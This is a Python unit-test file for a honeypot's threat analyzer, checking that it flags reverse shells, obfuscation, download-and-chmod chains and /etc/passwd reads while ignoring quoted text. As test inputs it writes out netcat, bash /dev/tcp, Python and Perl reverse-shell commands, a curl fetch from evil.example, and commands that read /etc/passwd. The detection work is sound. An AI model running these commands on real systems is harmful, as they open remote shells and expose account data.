"""Rule metadata and examples of executable versus quoted text."""

import io
import json
import unittest
from honeypot.intelligence.analyzer import Analyzer
from honeypot.intelligence.rules import RULES
from honeypot.logger import JsonEventLogger
from honeypot.session import SessionState


class RuleTests(unittest.TestCase):
    def test_metadata_and_confidence(self):
        self.assertEqual(len({rule.name for rule in RULES}), len(RULES))
        for rule in RULES:
            self.assertIn(rule.type, {"string", "regex"})
            self.assertTrue(rule.patterns)
            self.assertTrue(0 <= rule.confidence <= 1)
            self.assertTrue(rule.severity and rule.category and rule.description)
            self.assertIsInstance(rule.mitre, str)

    def test_reverse_shell_and_obfuscation(self):
        for command in ("nc -e /bin/sh 198.51.100.1 4444", "bash -i >& /dev/tcp/198.51.100.1/4444", "python -c 'import socket; socket.socket().connect((\"a\",4444))'", "perl -e 'use Socket; socket(PF_INET, SOCK_STREAM, 0); connect(S, X);'"):
            with self.subTest(command=command):
                self.assertIn("reverse_shell", Analyzer().analyze(command).matched_rules)
        for command in ("base64 -d payload", "eval foo", "python -c 'bytes.fromhex(\"aabb\")'"):
            with self.subTest(command=command):
                self.assertIn("obfuscation", Analyzer().analyze(command).matched_rules)

    def test_download_and_chmod_same_artifact_and_no_quoted_false_positive(self):
        result = Analyzer().analyze("curl -o /tmp/a.sh https://evil.example/a.sh && chmod +x /tmp/a.sh")
        self.assertIn("download_chmod_chain", result.matched_rules)
        self.assertNotIn("download_chmod_chain", Analyzer().analyze("wget -O /tmp/a.sh https://evil.example/a.sh && chmod +x /tmp/b.sh").matched_rules)
        for text in ("echo 'nc -e /bin/sh'", "echo 'curl -o /tmp/a.sh http://evil.example/a.sh && chmod +x /tmp/a.sh'"):
            self.assertEqual(Analyzer().analyze(text).matched_rules, ())

    def test_passwd_file_access_rule_and_session_summary(self):
        rule = next(rule for rule in RULES if rule.name == "passwd_file_access")
        self.assertEqual((rule.category, rule.severity, rule.score, rule.confidence), ("discovery", "LOW", 20, 0.85))
        self.assertEqual(rule.description, "Accessed local account database")
        for command in ("cat /etc/passwd", "less /etc/passwd", "more /etc/passwd", "grep root /etc/passwd", "grep -n -e root /etc/passwd", "head -n 1 /etc/passwd", "sed -n 1p /etc/passwd"):
            with self.subTest(command=command):
                result = Analyzer().analyze(command)
                self.assertIn(rule.name, result.matched_rules)
                self.assertIn("discovery", result.categories)
                self.assertIn("discovery", result.stages)
                self.assertEqual(result.risk_score, 20)
                self.assertEqual(result.threat, {"score": 20, "level": "LOW"})
                detection = next(item for item in result.detections if item["rule"] == rule.name)
                self.assertEqual((detection["score"], detection["confidence"], detection["severity"]), (20, 0.85, "LOW"))
        for command in ("echo 'cat /etc/passwd'", "cat /etc/passwd.bak", "grep /etc/passwd /tmp/data"):
            self.assertNotIn(rule.name, Analyzer().analyze(command).matched_rules)
        session = SessionState("192.0.2.1", 2222)
        result = session.intelligence.analyze("cat /etc/passwd")
        session.record_analysis("cat /etc/passwd", result)
        self.assertIn(rule.name, session.behaviors)
        self.assertEqual(session.threat_score, 20)
        self.assertIn(rule.name, [item["rule"] for item in session.detections])
        self.assertEqual(session.intelligence.summary()["category_counts"], {"discovery": 1})
        stream = io.StringIO()
        logger = JsonEventLogger(stream, asynchronous=False)
        logger.command(session, "cat /etc/passwd", "/root", 0, result.to_dict())
        logger.disconnect(session, "test")
        command_event, disconnect_event = [json.loads(line) for line in stream.getvalue().splitlines()]
        self.assertIn(rule.name, command_event["analysis"]["matched_rules"])
        self.assertIn(rule.name, [item["rule"] for item in command_event["detections"]])
        self.assertEqual(command_event["threat"], {"score": 20, "severity": "LOW"})
        self.assertIn(rule.name, disconnect_event["behaviors"])
        self.assertEqual(disconnect_event["intelligence"]["category_counts"], {"discovery": 1})


if __name__ == "__main__":
    unittest.main()
